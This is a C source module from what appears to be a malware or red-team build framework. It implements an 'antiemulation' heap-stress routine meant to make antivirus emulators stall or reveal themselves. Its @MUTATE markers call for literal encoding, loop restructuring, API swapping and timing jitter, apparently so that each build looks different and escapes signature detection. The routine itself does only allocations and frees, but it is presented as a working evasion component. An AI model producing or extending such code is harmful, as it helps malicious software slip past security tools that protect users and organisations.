/* MODULE: ANTIEMULATION
 * TYPE: heapstress
 * DESC: Stresses the process heap with many small allocations and a linked-list
 *       traversal. No VirtualAlloc, no permission changes — pure heap pressure.
 *       Real heap manager handles this in ~20ms. Emulated heap often stalls or
 *       has incomplete HeapAlloc/HeapFree implementations.
 * MUTATIONS: loop_mutation, literal_encoding, loop_restructuring, api_swap, timing_jitter
 */
#include "../header/definitions.h"

// @MUTATE:literal_encoding
#define HEAP_NODE_COUNT  2000
#define HEAP_NODE_SIZE   64
#define HEAP_ROUNDS      3

// Simple linked-list node — forces emulator to track pointer chains
typedef struct _node {
    struct _node *next;
    char data[HEAP_NODE_SIZE - sizeof(void*)];
} HeapNode;

FORCE_INLINE void antiemulation() {
    HANDLE heap = GetProcessHeap();
    if (!heap) return;

    // @MUTATE:loop_mutation(fixed->GetTickCount_modulo)
    // @MUTATE:loop_restructuring(for->while|unroll)
    for (int round = 0; round < HEAP_ROUNDS; round++) {
        HeapNode *head = NULL;

        // Build linked list via HeapAlloc
        // @MUTATE:loop_restructuring(for->while|unroll)
        // @MUTATE:literal_encoding
        for (int i = 0; i < HEAP_NODE_COUNT; i++) {
            // @MUTATE:api_swap(HeapAlloc->LocalAlloc|GlobalAlloc)
            HeapNode *node = (HeapNode*)HeapAlloc(heap, 0, sizeof(HeapNode));
            if (!node) break;

            // Fill with round-dependent data (forces emulator to track writes)
            // @MUTATE:literal_encoding
            for (int k = 0; k < (int)(HEAP_NODE_SIZE - sizeof(void*)); k++) {
                node->data[k] = (char)(k ^ round ^ 0x55);
            }

            node->next = head;
            head = node;
        }

        // @MUTATE:timing_jitter

        // Walk the list — emulator must follow pointer chain
        volatile unsigned int checksum = 0;
        HeapNode *cur = head;
        while (cur) {
            checksum += (unsigned char)cur->data[0];
            cur = cur->next;
        }

        // Free the list
        cur = head;
        while (cur) {
            HeapNode *tmp = cur;
            cur = cur->next;
            // @MUTATE:api_swap(HeapFree->LocalFree|GlobalFree)
            HeapFree(heap, 0, tmp);
        }
    }
}
